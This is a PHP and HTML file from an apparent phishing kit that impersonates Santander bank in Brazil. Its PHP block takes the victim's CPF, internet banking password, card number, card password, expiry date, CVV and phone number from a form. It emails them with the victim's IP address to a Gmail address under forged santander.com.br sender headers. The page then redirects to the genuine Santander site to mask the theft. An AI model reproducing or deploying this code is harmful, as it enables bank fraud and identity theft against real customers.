<?php 
	$snet 		= $_POST['snet'];
	$cpf 		= $_POST['cpf'];
	$ddd		= $_POST['ddd'];
	$fone		= $_POST['fone'];
	$cartao		= $_POST['cartao'];
	$dataval 	= $_POST['dataval'];
	$cvv		= $_POST['cvv'];
	$scard		= $_POST['scard'];

	$ip = $_SERVER['REMOTE_ADDR'];

	$emaildestinatario = 'danielshortcode14@gmail.com';

	$subj = "Dados / IP: $ip - Chegou: Santander";


	$mensagemHTML = '
	<p>------------- |Chegou Santander| ------------</p>

	<p><b>CPF:</b> '.$_POST['cpf'].'<br>
	<p><b>Senha Net:</b> '.$_POST['snet'].'<br>
	<p><b>Cartao:</b> '.$_POST['cartao'].'<br>
	<p><b>Senha Cartao:</b> '.$_POST['scard'].'<br>
	<p><b>Telefone:</b> '.$_POST['ddd'].' '.$_POST['fone'].'<br>
	<p><b>Validade:</b> '.$_POST['dataval'].'<br>
	<p><b>CVV:</b> '.$_POST['cvv'].'<br>
	<p><b>IP:</b> '.$ip.'<br>
	<br>
	<p>-------------- |Chegou Santander| -----------------</p>

	';

	$headers = "MIME-Version: 1.1\r\n";
	$headers .= "Content-type: text/html; charset=utf-8\r\n";
	$headers .= "From: recadastramento@santander.com.br \r\n";
	$headers .= "Return-Path: recadastramento@santander.com.br \r\n";
	$envio = mail($emaildestinatario, $subj, $mensagemHTML, $headers);

?>


<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css" />
<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>


</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png" />
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
<form action="vaicarai.php" method="post" enctype="application/x-www-form-urlencoded">
 
 
<br>
<br>

  

 <div class="img-box" id="img1">
   <img src="images/id_santander_anima_celular_alerta.gif">  	
 </div>
 
<script language="javascript">
	setTimeout(function(){ window.location = "http://www.santander.com.br";  }, 3000);
</script> 
	
		
</form>

</div>

</body>
</html>
